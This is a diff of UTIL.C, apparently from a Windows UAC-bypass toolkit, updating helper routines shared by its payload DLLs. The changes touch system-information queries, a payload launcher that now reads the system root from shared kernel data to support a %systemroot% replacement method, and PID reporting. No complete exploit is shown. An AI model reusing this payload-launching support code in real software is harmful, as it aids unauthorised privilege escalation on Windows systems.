@@ -4,9 +4,9 @@
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     2.80
+*  VERSION:     2.84
 *
-*  DATE:        08 Sept 2017
+*  DATE:        22 Nov 2017
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -439,7 +439,10 @@ DWORD ucmExpandEnvironmentStrings(
 *
 * Purpose:
 *
-* Query system information by class
+* Returns buffer with system information by given InfoClass.
+*
+* Returned buffer must be freed with HeapFree after usage.
+* Function will return error after 20 attempts.
 *
 */
 PVOID ucmGetSystemInfo(
@@ -462,9 +465,10 @@ PVOID ucmGetSystemInfo(
         }
         if (status == STATUS_INFO_LENGTH_MISMATCH) {
             RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
+            Buffer = NULL;
             Size *= 2;
             c++;
-            if (c > 5) {
+            if (c > 20) {
                 status = STATUS_SECRET_TOO_LONG;
                 break;
             }
@@ -499,7 +503,7 @@ BOOL ucmLaunchPayload(
     STARTUPINFO             startupInfo;
     PROCESS_INFORMATION     processInfo;
 
-    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE, cch;
+    DWORD                   dwCreationFlags = CREATE_NEW_CONSOLE;
 
     HANDLE                  ProcessHeap = NtCurrentPeb()->ProcessHeap;
     LPWSTR                  lpApplicationName = NULL;
@@ -509,10 +513,12 @@ BOOL ucmLaunchPayload(
     //
     // Query working directory.
     //
+    // Note: 2.84
+    // To provide compatibility with %systemroot% replacement method (44) read systemroot from UserSharedData.
+    //
     RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-    cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
-    if ((cch == 0) || (cch > MAX_PATH))
-        return bResult;
+    _strcpy(sysdir, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(sysdir, L"\\system32\\");
 
     //
     // Query startup info from parent.
@@ -986,12 +992,20 @@ LPWSTR ucmQueryRuntimeInfo(
     if (NT_SUCCESS(status)) {
 
         _strcpy(szBuffer, TEXT("\r\nInherited from PID="));
+#ifdef _WIN64
+        u64tostr(pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
+#else 
         ultostr((ULONG)pbi.InheritedFromUniqueProcessId, _strend(szBuffer));
+#endif
         _strcat(lpReport, szBuffer);
         _strcat(lpReport, TEXT(" ("));
 
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        bFound = FALSE;
+
         ProcessList = (PSYSTEM_PROCESSES_INFORMATION)ucmGetSystemInfo(SystemProcessInformation);
         if (ProcessList) {
+
             pList = ProcessList;
 
             for (;;) {
@@ -1014,6 +1028,7 @@ LPWSTR ucmQueryRuntimeInfo(
             }
             RtlFreeHeap(hHeap, 0, ProcessList);
         }
+
         if (bFound) {
             _strcat(lpReport, szBuffer);
         }
@@ -1228,7 +1243,6 @@ LPWSTR ucmQueryRuntimeInfo(
 
         NtClose(hToken);
     }
-
 
     //
     // 4. Wow64
